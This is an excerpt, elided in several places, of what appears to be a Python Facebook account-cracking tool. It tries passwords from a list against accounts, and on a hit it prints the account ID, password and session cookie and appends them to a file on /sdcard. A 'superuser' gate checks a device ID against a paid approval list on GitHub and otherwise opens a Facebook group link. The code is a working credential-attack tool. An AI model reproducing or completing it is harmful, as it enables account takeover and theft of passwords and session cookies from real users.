    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [AA-143-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/AA-33-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/cyber-attack33/Paid/blob/main/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://facebook.com/groups/death.cyber.army//")
        time.sleep(3.0)
        os.system("clear")
        print(logo)
